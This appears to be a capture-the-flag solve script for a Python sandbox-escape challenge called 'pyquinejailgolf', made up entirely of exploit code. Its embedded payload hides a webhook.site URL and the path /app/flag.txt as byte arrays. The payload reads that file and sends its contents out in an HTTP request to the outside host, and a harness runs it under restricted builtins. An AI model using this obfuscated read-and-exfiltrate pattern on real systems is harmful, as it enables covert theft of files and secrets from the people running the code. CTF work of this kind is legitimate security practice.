if __name__ == "__main__":
    program = """
#              pyquinejailgolf
from builtins import bytes,chr,open,str
import requests,uuid
requests.get(bytes([104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47]).decode()+str(uuid.UUID(int=0xdfcc005873ea4d47a984d45dbbd41e05))+chr(63)+open(bytes([47,97,112,112,47,102,108,97,103,46,116,120,116]).decode()).read())
""".strip()
    safe_builtins = {}
    for i in dir(__builtins__):
        if i[0] not in __import__("string").ascii_lowercase:
            safe_builtins[i] = eval(i)
    safe_builtins["print"] = print
    new_builtins = {"__builtins__": safe_builtins}
    try:
        exec(program, new_builtins, new_builtins)
    except Exception:
        raise
